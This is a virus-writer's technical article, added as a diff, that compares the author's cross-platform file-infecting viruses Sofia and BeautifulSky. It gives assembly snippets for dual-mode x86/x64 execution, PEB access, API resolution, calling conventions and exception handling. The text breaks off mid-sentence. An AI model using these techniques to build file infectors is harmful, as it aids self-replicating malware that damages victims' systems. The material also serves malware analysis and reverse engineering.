@@ -1,0 +1,949 @@
+﻿      _    _    ___   __     __  _____ ___ ___ _      _     _         _       
+     | |_ | |_ ( _ ) / /    / / |_   _| __/ __| |    /_\   | |   __ _| |__ ___
+     | ' \| ' \/ _ \/ _ \  / /    | | | _|\__ \ |__ / _ \  | |__/ _` | '_ (_-<
+     |_||_|_||_\___/\___/ /_/     |_| |___|___/____/_/ \_\ |____\__,_|_.__/__/
+
+                                                                   presents...
+       .*.
+     *' + '*      ,       ,
+      *'|'*       |`;`;`;`|
+        |         |:.'.'.'|
+        |         |:.:.:.:|
+        |         |::....:|
+        |        /`   / ` \
+        |       (   .' ^ \^)
+        |_.,   (    \    -/(
+     ,~`|   `~./     )._=/  )  ,,
+    {   |     (       )|   (.~`  `~,
+    {   |      \   _.'  \   )       }
+    ;   |       ;`\      `)-`       }     _.._
+     '.(\,     ;   `\    / `.       }__.-'__.-'    An analysis of W32/64.Sofia
+      ( (/-;~~`;     `\_/    ;   .'`  _.-'  and the new BEAUTIFULSKY code base
+      `/|\/   .'\.    /o\   ,`~~`~~~~`
+       \| ` .'   \'--'   '-`
+        |--',==~~`)       (`~~==,_
+  jgs   ,=~`      `-.     /       `~=,
+     ,=`             `-._/            `=,
+
+
+                                                                    21/12/2017
+                                                           fsendjinn@gmail.com
+
+Intro
+
+Some years ago, I wrote my first cross-platform code which I named Sofia. This
+was  primarily  a  Proof of Concept virus demonstrating how to mix x86 and x64
+assembly.    Most of it consisted of detecting the execution mode coupled with
+conditional statements that allowed  it  to  run platform compatible code when
+needed.   I *almost* achieved to create the world's first cross-platform virus
+code that had a single execution path.
+
+Today, I want to review  Sofia,  and analyse the core techniques I thought and
+implemented, and compare them with a successor code base I named BeautifulSky.
+This article is a standalone, and don't need to have access to the source code
+of  both  viruses  to be understandable, but knowledge of x86/x64 assembly and
+W32/W64 is needed.
+
+
+BeautifulSky
+
+Before Sofia was created,  the virus writer roy g biv had published an article
+in 2009 detailing a new technique he called Heaven's Gate.  This short article
+showed how  to  execute  x64  code in a WoW64 (32-bit) process.  His PoC virus 
+W32/64.Heaven  further  demonstrated  this feature of WoW64, and together with 
+his W32/64.Shrug virus, inspired me to write Sofia.
+
+Heaven only used its  technique to jump into 64-bit mode therefore much of its
+code was x64 using a native interface (NTDLL API).  Shrug48  stuck  together a
+x86 and a x64 version of itself.   Sofia was an attempt to make something like
+Shrug48, but more compact.    Now almost in 2018 with new operating systems in
+the  Windows  family,  and  the introduction of new protections in Windows 10, 
+Heaven's Gate is no longer available so easily anymore for usermode.
+
+What we  now  know  is  that  it's entirely possible to write a single x86/x64 
+assembly code  which can run in both 32-bit/64-bit  mode  by  using  carefully 
+chosen encoding, a common API set, and the basic arithmetic we all know.
+
+Besides, 6 years later  since  Sofia, the  infosec scene has picked a trend to 
+make double-words codenames for fancy projects.  This is a fancy project and I
+needed a fancy name, so I named it after a song by Masayoshi Minoshima.
+
+
+                                         ______
+                                         | ___ \                           | |
+                                         | |_/ / _____      ____ _ _ __ ___| |
+                                         | ___ \/ _ \ \ /\ / / _` | '__/ _ \ |
+                                         | |_/ /  __/\ V  V / (_| | | |  __/_|
+                                         \____/ \___| \_/\_/ \__,_|_|  \___(_)
+                                                                there could be
+                                Dragons, dense text and x64/x86 assembly code!
+
+
+What's new in BeautifulSky?
+
+– uses the same code to run in both x86/x64 modes, single execution path
+– fully x86/x64 compatible encoding
+– no self-modifying code to achieve compatibility
+– position independent-code and compatible with Address Space Layout Randomization
+– uses Process Environment Block (PEB) to get kernel32/ntdll directly on both platforms
+– stdcall/x64 calling convention compatible
+– own GetProcAddress() that supports PE32/PE32+
+– uses CRC32 instead of name strings
+– uses Vectored Exception Handler for common exception handling on both platforms
+
+and still there is much more. :)
+
+BeautifulSky  searches the current directory for any file (e.g find mask *.*).
+To  open  and  map  files for infection it uses an adapted and more  efficient
+version of a technique used by W32.Cabanas virus by Jacky Qwerty in 1998.
+
+The  code,  unlike Sofia's,  was  written in pure x86 code in good old masm32.
+The  reason behind this is that it is easier to visualize what the  code looks
+like in both x86/64.  It feels more natural for people to look at x86 assembly
+code like this where prefixes are visible,  and the dual-mode execution can be
+seen clearly.  In the text we will find that Sofia's code is x64, BeautifulSky
+will be x86, and examples will be sometimes provided with code for both modes.
+
+
+                                 _____ _     _         _       _             
+                                 |  _  | |   | |       (_)     (_)            
+                                 | | | | |__ | |_  __ _ _ _ __  _ _ __   __ _ 
+                                 | | | | '_ \| __|/ _` | | '_ \| | '_ \ / _` |
+                                 \ \_/ / |_) | |_| (_| | | | | | | | | | (_| |
+                                  \___/|_.__/ \__|\__,_|_|_| |_|_|_| |_|\__, |
+                                                                         __/ |
+                                                                        |___/
+                                                             the platform/mode
+
+First, the code needs a function to obtain the mode – x86/x64 – in which  it's
+running.  This  will  be  helpful  when  deciding  how  to  use  memory access 
+instructions which are compatible with 32/64-bit pointers, etc.
+
+Let's see that function from Sofia:
+
+x64:
+
+riprel:
+                        push rax
+48 08 0D 00 00 00 00    lea  rcx, qword ptr [rip]
+                        pop  rax
+                        ret
+x86:
+
+riprel:
+                        push eax
+48                      dec  eax
+08 0D 00 00 00 00       lea  ecx, dword ptr [0]
+                        pop  eax
+                        ret
+                        
+The function  in x64 mode has the effect of moving the  current IP to RCX, but
+in x86  there is no equivalent instruction because EIP can't be used this way,
+thus  the  value of ECX becomes zero.  So the function returns zero if x86, or
+non-zero if x64.
+
+Here  we  also learn about the first encoding difference,  let's read a bit of
+Intel's documentation to learn more about it:
+
+"REX prefixes are a set of 16 opcodes  that span one row of the opcode map and
+occupy entries 40H to 4FH.  These opcodes represent valid instructions (INC or
+DEC) in  IA-32 operating modes and in compatibility mode.  In 64-bit mode, the 
+same  opcodes  represent  the instruction prefix REX and  are  not  treated as 
+individual  instructions.  The  single-byte-opcode   forms   of   the  INC/DEC 
+instructions are not available in 64-bit mode.  INC/DEC functionality is still 
+available using ModR/M forms of the same instructions (opcodes FF/0 and FF/1)"
+
+What we saw  there as dec eax (opcode 48h) in x86, is a REX prefix in x64 that 
+turns the addressing and registers to 64-bit.
+
+The  implementation  of  the function in Sofia served the purpose of directing
+the flow of execution in a conditional way: “if this is x86 mode, then run x86
+code for W32, else run x64 code for W64.”
+
+In BeautifulSky, I created a new function after  learning the values of the CS 
+segment register: 33h for W64, and different values for W32.  This  was a good
+starting point and I decided to make the function return 0, or 1. Just one bit
+to rule them all. ;)
+
+x86/x64:
+
+        mov     ecx, cs
+        cmp     ecx, 33h
+        setz    cl
+        ret
+
+Later, I upgraded it to an architecture/platform-independent trick:
+
+        xor     eax, eax
+        mov     ecx, eax  
+        dec     eax
+        setz    cl
+
+XOR sets ZF=1.  In x86 DEC sets ZF=0, and SETZ sets CL=0.  In  x64  DEC is REX
+prefix, no effect; SETZ sets CL=1.
+
+But when qkumba saw my code, he made a smaller gem of detection code:
+
+        xor     ecx, ecx
+        arpl    cx, cx
+    
+XOR sets ZF=1.  ARPL instruction sets ZF=0 in x86.   But here is the trick: in
+x64 mode, ARPL  opcode  was  reassigned to the MOVSXD instruction that doesn't
+alter any flag, thus ZF=1.  With SETZ to CL, we get the bit that we need.
+
+Of course, this code was too good not to use it. :)
+
+
+                                  _____ _     _         _       _             
+                                 |  _  | |   | |       (_)     (_)            
+                                 | | | | |__ | |_  __ _ _ _ __  _ _ __   __ _ 
+                                 | | | | '_ \| __|/ _` | | '_ \| | '_ \ / _` |
+                                 \ \_/ / |_) | |_| (_| | | | | | | | | | (_| |
+                                  \___/|_.__/ \__|\__,_|_|_| |_|_|_| |_|\__, |
+                                                                         __/ |
+                                                                        |___/
+                                                 the Process Environment Block
+
+Both  Sofia  and  BeautifulSky first attempt to obtain the PEB address for two 
+tasks:  get the image base of the host, and the pointer to PEB_LDR_DATA  where
+the needed DLL's base addresses can be found to resolve API addresses.  In the
+Thread Environment Block (TEB), the  pointer  to PEB is at offset 30h for W32, 
+and 60h for W64.
+
+Now the most common way to get the PEB address is this:
+
+x86:
+6a 30        push teb.peb
+59           pop  ecx
+64 8b 31     mov  esi, dword ptr fs:[ecx]
+
+x64:
+6a 60        push teb.peb
+59           pop  rcx
+65 48 8b 31  mov  rsi, qword ptr gs:[rcx]
+
+The  difference  in  encoding  and  platform  is  clear now: different segment 
+register means different opcode, and  there is a  REX  prefix  because  of the
+qword ptr [..].   I thought about how to solve this by adjusting the registers
+depending the mode.   But  we  already  have  another problem, the REX prefix. 
+If  altered accordingly, in x86 it becomes 64 48 fs:dec eax.  The  problem  is
+that for x86: fs loses effect since MOV becomes an instruction apart and might
+access invalid memory.
+
+We  can't  exchange  places  between  prefixes to make it compatible both ways 
+because  in  x64  that  would cause the addressing to be 32-bit, since the REX
+prefix must go before the instruction opcodes to work.
+
+There are some solutions.
+
+One  is  to  use a double prefix which looks like this: 64 64 8B 31 fs:fs:mov.
+It  works for x86, and in x64 mode the first prefix must be adjusted to 65 gs,
+and the second to 48 dec eax, so it becomes 65 48 8B 31:
+
+x86 example:
+        call    l1
+l1:
+        pop     edx
+        call    platform
+        mov     al, 64h
+        mov     byte ptr [edx + (offset selector2 - offset l1)], al
+        add     al, cl
+        mov     byte ptr [edx + (offset selector1 - offset l1)], al
+        imul    eax, ecx, 64h - 48h
+        sub     byte ptr [edx + (offset selector2 - offset l1)], al
+        db      0ffh, 0c1h                   ;in x86 inc ecx, in x64 inc rcx
+        imul    esi, ecx, 30h
+
+selector1:
+        db      64h                          ;in 32-bit mode becomes fs, in 64-bit mode becomes gs
+                                    
+selector2:
+        db      64h                          ;in 32-bit mode becomes fs, in 64-bit mode becomes REX
+        mov     ebx, dword ptr [esi]
+
+This is a weird solution, but it is useful if the code doesn't start executing
+via AddressOfEntryPoint.   Now let's think a solution if execution does starts
+via AddressOfEntryPoint:
+
+In both W32/W64 platforms, EBX/RCX is the address to the PEB.   So it wouldn't 
+need  to  access the TEB and no segment registers!  Just  adjust  the register
+according to the mode.
+
+x86 example:
+
+        call    l1
+l1:
+        pop     edx
+        push    ecx
+        call    platform
+        mov     al, 53h  ;push ebx
+        sub     al, cl
+        sub     al, cl
+
+        ;in x64 edx is rdx
+        mov     byte ptr [edx + (offset switchreg - offset l1)], al
+        imul    edi, ecx, 8
+        pop     ecx
+
+switchreg:
+        push    ecx  ;in x86/x64 becomes ebx/ecx
+        pop     ebx
+
+What  about  achieving the same with no self-modifying code? We can use CMOVcc 
+to do that, but not using our platform function (that alters ECX/RCX register,
+needed in x64 mode), we can do this instead:
+
+x86 example:
+
+        xor     eax, eax
+        dec     eax
+        cmovns  ebx, ecx
+
+And x64 looks like this:
+
+        xor     eax, eax
+        cmovns  rbx, rcx
+
+This trick is simple.  EAX/RAX  is  set to 0, and this makes SF=0. In x86 mode
+dec eax sets SF=1. In x64, dec eax is REX prefix, thus EAX/RAX  and SF are not
+altered.
+
+No move occurs in x86 mode, and in x64 RCX (PEB pointer) is now in RBX, making
+it both ways compatible.
+
+This  solution  eventually  led  me  to  think differently on how to solve the
+problem with the segment registers.  Can we use CMOVcc and decide when to move
+from fs:[30h] or gs:[60h]? Yes, we can, let's do it:
+
+x86:
+
+        push    60h
+        pop     edx        
+        xor     eax, eax
+        push    eax
+        dec     eax
+        cmovs   ebx, dword ptr fs:[30h]
+        cmovs   edx, esp
+        db      65h
+        dec     eax
+        cmovns  ebx, dword ptr [edx] 
+
+First, the PEB's offset 60h in the W64's TEB is assigned to EDX/RDX.  XOR sets
+SF=0. In x86 DEC sets  SF=1, but in x64 DEC is a REX prefix. In x86 CMOVS sets
+EBX with the PEB address.   But what happens in x64? The internal operation of
+CMOVcc is to fetch the SRC operand before the conditional occurs.   This means
+that in x64 there is also a read to fs:[30h].     This is why I didn't use the 
+bit mode to dynamically calculate the right offset to the PEB.    However, the
+way this instruction is encoded  with  hardcoded 30h offset,   in x64 makes it
+read a DWORD from RIP going through FS but works.   If we would had calculated
+the offset in EDX/RDX and encoded it as fs:[edx]/fs:[rdx], it would've failed,
+assuming that at the time this code is executed, 60h is an invalid address.
+
+The  next  CMOVS,  in  x86  mode moves ESP to EDX. Notice that the instruction 
+doesn't  use  the  REX prefix, because it is only needed to take effect in x86
+mode.  The  next  CMOVNS  is  a  little trickier, but we discussed this opcode 
+arrangement  before.  We want to have the GS prefix before the REX.  In x86 it
+will become gs:dec eax, and CMOVNS an instruction apart. In x64 it will become
+cmovns rbx, qword ptr [rdx].  This arrangement disables the read from gs:[60h]
+in x86, and  we  need  to have a valid memory field in EDX that the CMOVNS can
+read, that's why only in x86 we moved ESP to EDX. In x64 moves the PEB address
+to RBX.
+
+This  technique  is currently used in BeautifulSky if the code does not starts
+by AddressOfEntryPoint, but it's a decision that must be made before compiling
+the code.
+
+                                     /   \       
+    _                        )      ((   ))     (
+   (@)                      /|\      ))_((     /|\
+   |-|                     / | \    (/\|/\)   / | \                      (@)
+   | | -------------------/--|-voV---\`|'/--Vov-|--\---------------------|-|
+   |-|                         '^`   (o o)  '^`                          | |
+   | |                               `\Y/'                               |-|
+   |-|              Fun fact: contrary to popular opinion                | |
+   | |  Dragons enjoy ice cream and secretly acquire it in large amounts |-|
+   |-|           specially banana with dulce de leche combo              | |
+   | |                                                                   |-|
+   |_|___________________________________________________________________| |
+   (@)              l   /\ /         ( (       \ /\   l                `\|-|
+                    l /   V           \ \       V   \ l                  (@)
+                    l/                _) )_          \I
+                                      `\ /'
+
+Now let's see what the entry point code in Sofia looked like:
+
+sofia_push      label    near
+        push    0deadbabeh  
+        call    riprel
+        jecxz   go_peb32
+
+        ;here begins 64-bit part, not executed in 32-bit mode!
+
+        push    60h
+        pop     rsi
+        lods    qword ptr gs:[rsi]
+        mov     rcx, qword ptr [rax + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE + 8]
+        add     qword ptr [rsp], rcx  ;convert RVA to VA
+        ...
+        jmp     double_call
+
+        ;here ends 64-bit part
+
+        ;here begins 32-bit part, not executed in 64-bit mode!
+
+go_peb32        label    near
+        push    30h
+        pop     rsi
+        lods    dword ptr fs:[esi]
+        mov     eax, dword ptr [eax + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE]
+        add     dword ptr [esp], eax  ;convert RVA to VA
+
+There  are  two  reasons  why this code can't seem to be combined:  1) because 
+of the segment registers problem;  2) because the offset to dwImageBaseAddress
+in PEB is 8 in W32, and 10h in W64.
+
+First, the RVA (AddressOfEntryPoint is an RVA and DWORD for both platforms) is
+pushed onto the stack. Next, call riprel, if x86, jump to x86 code...
+
+Now see one of the entry point codes in BeautifulSky:
+
+x86:
+        push    "6891"        ;replaced by entrypoint                     
+        push    esi
+        push    ebp
+        push    edi
+        push    ebx
+        push    edx
+        push    ecx
+        push    eax
+        xor     eax, eax
+        dec     eax
+        cmovns  ebx, ecx
+        call    platform
+        db      0ffh, 0c1h    ;inc ecx
+        imul    esi, ecx, dword * 7
+        imul    edx, ecx, PEB32.dwImageBaseAddress
+        dec     eax
+        mov     edx, dword ptr [ebx + edx]
+        dec     eax
+        add     dword ptr [esp + esi], edx
+
+x64 equivalent:
+        push    "6891"        ;replaced by entrypoint                     
+        push    rsi
+        push    rbp
+        push    rdi
+        push    rbx
+        push    rdx
+        push    rcx
+        push    rax
+        xor     eax, eax
+        cmovns  rbx, rcx
+        call    platform
+        db      0ffh, 0c1h    ;inc ecx
+        imul    esi, ecx, dword * 7
+        imul    edx, ecx, PEB32.dwImageBaseAddress
+        mov     rdx, qword ptr [rbx + rdx]
+        add     qword ptr [rsp + rsi], rdx
+
+Super different, isn't it?
+
+First,  the RVA  is pushed onto the stack, and then all registers that need to
+be preserved (remember there is no PUSHAD/POPAD instructions in x64). Next the
+registers are adjusted accordingly to have the PEB address in EBX/RBX. 
+
+platform  is  called;  and  we  increase  ECX by 1, so  1  for x86, 2 for x64; 
+multiply ECX by (dword * saved registers count), and store the  result in ESI,
+now  it  has the offset to the RVA in the stack; multiply ECX by 8, and  store
+the  result  in  EDX,  so  8  if  x86, 10h  in  x64,  now it has the offset to 
+dwImageBaseAddress and it can now update the RVA.
+
+Finally, we are done with this part!
+
+In  the  case of the code that resolves kernel32 and ntdll's base address, the 
+story  is  more of  the  same: divided code for Sofia because of difference in 
+offsets; BeautifulSky calculates the offsets and the code is fully compatible,
+even simpler.
+
+
+                  _    _       _ _    _              ______ _      _          
+                 | |  | |     | | |  (_)             |  _  \ |    | |         
+                 | |  | | __ _| | | ___ _ __   __ _  | | | | |    | |     ___ 
+                 | |/\| |/ _` | | |/ / | '_ \ / _` | | | | | |    | |    / __|
+                 \  /\  / (_| | |   <| | | | | (_| | | |/ /| |____| |____\__ \
+                  \/  \/ \__,_|_|_|\_\_|_| |_|\__, | |___/ \_____/\_____/|___/
+                                               __/ |                          
+                                              |___/ 
+
+
+If  you  have  ever written code to parse a PE32 DLL and its export directory, 
+you  will  be  happy  to know that RVAs continue to be 32-bit.  Therefore  the
+IMAGE_EXPORT_DIRECTORY  and other structures continue to be the same for  both
+PE32/PE32+.   However,  IMAGE_OPTIONAL_HEADER structure did change: BaseOfData 
+field is gone, Imagebase and SizeOf*Reserve/SizeOf*Commit are 64-bit.
+
+As easy as it might be  travelling from the DOS header to the Export Directory
+on a loaded DLL, I still managed to make one silly mistake in Sofia:
+
+        push    rax
+        pop     rdx
+        add     al, 78h
+        call    riprel
+        jecxz   l1
+        add     al, IMAGE_OHDD64_EXPORT_TABLE - (IMAGE_DOS_HEADER.e_lfanew * 2)
+l1:     add     eax, dword ptr [rdx + IMAGE_DOS_HEADER.e_lfanew]
+        mov     ebp, dword ptr [rax]
+        add     rbp, rdx
+
+In  the  beginning EAX/RAX and EDX/RDX are set to the base address of the DLL, 
+then  adds to AL the offset of the Export Directory (from the beginning of the 
+PE header). riprel is used to determinate the mode, so  that  it  can  further
+add  to  AL the difference of the offset  between the PE32 and PE32+. Next, in
+both modes it adds the offset to the PE header.  Now EAX/RAX is the pointer to
+Export Directory in the Data Directory.  It moves the RVA to ebp and correctly
+adds the 64-bit base address of the DLL.
+
+The bug is located in the add eax, dword ptr [edx + 3ch] instruction.  It is a
+32-bit addition to the lower 32-bit section of the 64-bit register, this  type
+of operation causes the upper 32-bit part to be zeroed in x64 mode.  Let's see
+the path in x64 mode and the changes to RAX for more clarity:
+
+add al, 78h          -> rax = 00000040-00000078 
+add al, 10h          -> rax = 00000040-00000088
+add eax, [edx + 3ch] -> rax = 00000000-00000xxx
+
+It would  be  safe to think that Sofia should have never worked in 64-bit mode
+then. But in his analysis of Sofia, Peter Ferrie states:
+
+"it just so happens that the image base of both of those DLLs is always in the
+low 2GB range, and  thus the size of the image base never exceeds 32 bits.  In
+the case of kernelbase.dll and a number of other introduced DLLs, on the other
+hand,  the  size  of  the  image base  does  exceed  32 bits. If the virus had 
+attempted to access any APIs from such a DLL, then the bug would have caused a
+crash."
+
+                                      .  .   ~~//====......          __--~ ~~
+                      -.            \_|//     |||\\  ~~~~~~::::... /~
+                   ___-==_       _-~o~  \/    |||  \\            _/~~-
+           __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
+       _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
+     .~       .~       |   \\ -_    /  /-   /   ||      \   /
+    /  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
+    |~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
+             '         ~-|      /|    |-~\~~       __--~~
+                         |-~~-_/ |    |   ~\_   _-~            /\
+                              /  \     \__   \/~                \__
+                          _--~ _/ | .-~~____--~-/                  ~~==.
+                         ((->/~   '.|||' -_|    ~~-/ ,              . _||
+                                    -_     ~\      ~~---l__i__i__i--~~_/
+                                    _-~-__   ~)  \--______________--~~
+                                  //.-~~~-~_--~- |-------~~~~~~~~
+                                         //.-~~~--\
+                                                                     a Dragon!
+
+
+BeautifulSky code is almost the same,  but  offsets differences are calculated
+using the platform bit:
+
+        call    platform
+        shl     cl, 4
+        mov     edx, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
+        add     edx, ecx
+        mov     ebx, dword ptr [ebp + edx + IMAGE_EXPORT_DIRECTORY32]
+
+CL=0  in  x86  mode,  or  CL=1  in  x64. I use the RVA of the Export Directory 
+differently:  instead of having a pointer to IMAGE_EXPORT_DIRECTORY,  we  have
+EBX/RBX with the RVA and EBP/RBP with the base address of the DLL:
+
+        mov     ecx, dword ptr [ebp + ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
+        dec     eax
+        add     ecx, ebp
+
+That's it for resolving API addresses. Both codes are very similar.
+
+
+                        _____       _ _ _                ___ ______ _____     
+                       /  __ \     | | (_)              / _ \| ___ \_   _|    
+                       | /  \/ __ _| | |_ _ __   __ _  / /_\ \ |_/ / | |  ___ 
+                       | |    / _` | | | | '_ \ / _` | |  _  |  __/  | | / __|
+                       | \__/\ (_| | | | | | | | (_| | | | | | |    _| |_\__ \
+                        \____/\__,_|_|_|_|_| |_|\__, | \_| |_|_|    \___/|___/
+                                                 __/ |                        
+                                                 |___/                         
+
+
+Some  of  you might be wondering how we can call APIs in a compatible way when
+stdcall is entirely different from the x64 calling convention (x64CC).
+
+In x64CC, the four first parameters are placed in registers RCX/RDX/R8/R9 with
+the remainder stored on the stack.   A shadow space (4 slots * QWORD) to store
+these  registers  is  required  on  the  stack  even if the API doesn't have 4
+parameters.
+
+The  call  must also be aligned to a 16-byte boundary in case the API uses SSE
+instructions.  So, for example, a call to FindFirstFileW looks like this:
+
+Assuming the stack is aligned at this point, here is the W64 version:
+
+mov     rdx, lpFindFileData
+mov     rcx, lpFileName
+sub     rsp, 20h + 8
+call    FindFirstFileW
+
+Shadow stack layout:
+
+offset data
+18     r9  slot
+10     r8  slot
+8      rdx slot
+0      rcx slot
+
+We still need one more slot, because the return address unaligns the stack. In
+offset 20h,   we would have those 8 more bytes to align.   One "sub rsp, 8" is
+equivalent to a PUSH operation in 64-bit mode.  Thus it can be made compatible
+this way:
+
+mov     rdx, lpFindFileData
+mov     rcx, lpFileName
+sub     rsp, 10h + 8
+push    rdx ;in x86 mode push lpFindFileData
+push    rcx ;in x86 mode push lpFileName
+call    FindFirstFileW
+
+Basically, in x86 mode the arguments will be taken from the stack,  and in x64
+mode from registers and the arguments for x86 are just shadow stack. :)
+
+Let's see how this happens in Sofia:
+
+        push    rsp
+        pop     rdi
+        enter   stack buffer size, 0
+        push    rsp
+        pop     rsi
+        push    rsi
+        pop     rdx
+        sub     rsp, 18h
+        push    rsi                   ;in  param2
+        push    rcx                   ;in 32-bit param1
+        push    kFindFirstFileA
+        pop     rax
+        call    call_apisize
+        call    qword ptr [rdi + rax] ;32/64-bit compatible CALL
+...
+call_apisize    proc
+        push    rcx
+        call    riprel
+        jecxz   addr_api32bit
+        shl     eax, 3                ;in 64-bit mode only
+        pop     rcx
+        ret
+
+addr_api32bit   label    near         ;in 32-bit mode only
+        shl     eax, 2
+        pop     rcx
+        ret
+call_apisize    endp
+
+
+First,  EDI/RDI  becomes  the  stack-frame pointer for the API addresses list. 
+A  buffer  is  allocated  for  WIN32_FIND_DATA structure and the arguments are
+pushed to the stack as I described before.
+
+We  can  see that EAX/RAX will hold an index for kFindFirstFileA (index in the
+fashion of... 0, 1, 2...)  that  will be used to calculate the position of the
+address in the stack,   and there is a call to  call_apisize  to calculate the
+offset.   But  before  we  move  to  describe the function,  we can see a nice
+call qword ptr [...] that is compatible for both platforms.  No prefix needed.
+
+call_apisize gets the index in EAX/RAX, and... if 32-bit mode,  multiply by 4,
+else by 8. And now you can feel my disappointment.
+
+It is a simple as that.
+
+BeautifulSky doesn't improve too much on this front.   It uses the API offsets
+from x86 mode instead of index:
+
+x86:
+        ;we are here after getting APIs and they are in the stack now
+
+        call    skip_dyncall
+        push    ecx
+        call    platform
+        shl     eax, cl
+        pop     ecx
+        jmp     dword ptr [esi + eax]
+
+skip_dyncall    label    near
+        push    esp
+        pop     esi
+
+        ;enter buffer and push args go here
+        ...
+        push    dword + kernel32.kFindFirstFileW
+        pop     eax
+        call    dword ptr [esi]
+
+The  new  call_apisize  takes the platform bit to makes a shift-left by 0 or 1 
+(same as multiplying by 2).  Now it has the right offset and jumps to the API.
+When the API returns, it returns correctly after call dword ptr [esi].
+
+Finding files is a loop, you might be wondering how we can make it to clean up
+the stack after every call when in x86 mode the API (or callee)  cleans up the
+stack with "retn N" but in x64CC they do not.  Could there be a chance for the
+loop to overflow the stack with the arguments for FindNextFileW?  If the stack
+is small, or there is just too many files, it could happen.
+
+x86:
+
+test_dir        label    near
+        ...
+        call    open_append
+        ...
+        push    edi
+        pop     edx
+        mov     ecx, ebp
+        push    edx
+        push    ecx
+        push    dword + kernel32.kFindNextFileW
+        pop     eax
+        call    dword ptr [esi]
+        xchg    edx, eax
+        call    platform
+        shl     cl, 4
+        dec     eax
+        add     esp, ecx
+        test    edx, edx
+        jnz     test_dir
+
+BeautifulSky does  not  release  the shadow space used in FindFirstFileW call, 
+because it can use two slots for FindNextFileW().  This  API  will  add to new 
+slots  that  must  be  released  before we can loop again: the platform bit is
+shifted left to make it 10h only in x64, and add it to RSP and it's done.
+
+I  included  a  new function in BeautifulSky to do the stack release for other
+cases.  Sofia had the "if x86, release this much, else this much" type of code
+again.  The new function is for convenience and future additions/alteration of
+the code.  Now let's take for example,   SetFileAttributesW that take only two
+arguments.
+
+x86:
+
+set_fileattr    proc     near
+        lea     ecx, dword ptr [edi + WIN32_FIND_DATAW.cFileName]
+        push    edx
+        push    edx
+        push    edx
+        push    ecx
+        push    dword + kernel32.kSetFileAttributesW
+        pop     eax
+        call    dword ptr [esi]
+        push    dword * 2
+        push    qword * 4 - dword * 2
+        call    release_stack
+        ret
+set_fileattr    endp
+
+release_stack   proc     near
+        pop     edx
+        call    platform
+        pop     eax
+        imul    ecx, eax
+        pop     eax
+        add     ecx, eax
+        dec     eax
+        add     esp, ecx
+        jmp     edx
+release_stack   endp
+
+In x86 mode it needs to release 2 slots that belong to x64 mode.   In x64 mode
+it  needs  to  release  the  shadow  space entirely. release_stack dynamically
+adjusts ESP/RSP and jumps back.
+
+
+                                  _____                     _   _             
+                                 |  ___|                   | | (_)            
+                                 | |____  __ ___  ___ _ __ | |_ _  ___  _ __  
+                                 |  __\ \/ // __|/ _ \ '_ \| __| |/ _ \| '_ \ 
+                                 | |___>  <| (__|  __/ |_) | |_| | (_) | | | |
+                                 \____/_/\_\\___|\___| .__/ \__|_|\___/|_| |_|
+                                                     | |                      
+                                                     |_|
+                                                 Handling with VEH for W32/W64
+
+SEH isn't available in W64 in the same way.     It became a table in the image
+that  describes  where the protected code begins and where it ends,  describes 
+the stack and registers, etc.   It also has a pointer to the exception handler
+for that code.   It is possible to use APIs to use this table,   but it is not
+compatible with W32.
+
+When  I  made Sofia I also took the opportunity to create W64/Haley which uses
+this table for an EntryPoint Obscuring technique.
+
+The  solution instead is to use Vectored Exception Handlers that is API based,
+and it works in both platforms
+
+Sofia:
+
+        call    infect_file
+;vectored handler begins here
+infect_file:
+        pop   rcx           ;return address is handler address
+        push  rcx
+        pop   rdx
+        push  rcx           ;in 32-bit arg2
+        push  rdx           ;in 32-bit arg1
+        push  ntRtlAddVectoredExceptionHandler
+        pop   rax
+        call  call_apisize
+        call  qword ptr [rdi + rax]
+;push regs to save here
+        mov   rdx, rsp      ;save in compatible register both modes
+
+This  is  how  I  still  do  it today.  You can see the stack-frame is set and 
+registers  are  saved,   specifically  those that must survive an exception of 
+catastrophic proportions, specially if we didn't intend to cause it. :)
+
+Here is the entry point of the Vectored Handler in Sofia:
+
+        push    rcx
+        call    riprel
+        jecxz   vehfix_call32 
+
+;here begins 64-bit part, not executed in 32-bit mode!
+
+        pop     rcx
+        mov     rax, qword ptr [rcx + POINTER_CONTEXT_RECORD64]
+        add     rax, 7fh
+        call    vehfix_regs64
+        jmp     remove_veh
+
+;here ends 64-bit part
+
+;here begins 32-bit part, not executed in 64-bit mode!
+vehfix_call32:
+        pop     rcx
+        mov     eax, dword ptr [esp + POINTER_CONTEXT_RECORD32]
+        add     eax, 7fh
+        call    vehfix_regs32   ;here ends 32bit part
+
+
+The handler is divided and for a "good reason".  In W64, RCX is ExceptionInfo,
+a pointer to the EXCEPTION_POINTERS struct. In W32 the pointer is sent via the
+stack. Interesting problem back then.
+
+Lets see how I solved it this time:
+
+
+        pop     edx      ;return
+        pop     eax      ;ExceptionInfo in x86
+        push    ebx
+        push    eax
+        pop     ebx
+        xor     eax, eax
+        dec     eax
+        cmovns  ebx, ecx
+
+The trick is: in both modes it makes a pop of what should be ExceptionInfo: in
+x86 mode it is, but in x64 mode poped the first slot in the shadow stack.  And
+we make use of the CMOVcc trick again. Now the correct pointer is in RBX.
+
+The second part to this is that it needs to make a  "retn 4"  operation in x86
+mode but not in x64. The return address is safe in EDX/RDX, and the pointer is
+out of the stack already with the pop eax.   In x64 however, we  have  to undo
+that pop before we go back.
+
+Lets see the second part of the handler in Sofia:
+
+vehfix_regs32   proc  ;in 32-bit mode only
+        pop     qword ptr [rax + CONTEXT_EIP - 7fh]
+        push    qword ptr [rax + CONTEXT_EDX - 7fh]
+                      ;ESP is lost
+        pop     qword ptr [rax + CONTEXT_ESP - 7fh]
+        jmp     return_veh
+vehfix_regs32   endp
+
+vehfix_regs64   proc  ;in 64-bit mode only
+        pop     qword ptr [rax + CONTEXT_RIP - 7fh]
+        push    qword ptr [rax + CONTEXT_RDX - 7fh]
+                      ;RSP is lost
+        pop     qword ptr [rax + CONTEXT_RSP - 7fh]
+
+        ;both 32-bit and 64-bit modes
+
+return_veh      label    near
+        or      eax, EXCEPTION_CONTINUE_EXECUTION
+        ret        
+vehfix_regs64   endp
+
+I  mentioned in the source code "VEH fixer must be separated", because offsets
+of the registers in CONTEXT structure are different for W32/W64.   It is worth
